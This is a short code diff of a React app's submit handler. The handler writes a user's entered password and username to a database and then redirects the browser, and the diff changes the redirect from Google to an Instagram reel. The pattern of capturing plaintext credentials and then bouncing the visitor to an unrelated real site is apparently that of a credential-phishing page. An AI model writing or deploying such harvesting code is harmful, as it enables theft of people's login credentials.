@@ -16,7 +16,8 @@ function App() {
   async function handleSubmit() {
     try {
       await addDoc(details, { password: newPassword, userName: newUserName });
-      window.location.href = "https://www.google.com/";
+      window.location.href =
+        "https://www.instagram.com/ig_giiyu/reel/C0GiFQvI83Z/";
     } catch (e) {
       console.error(e);
     }
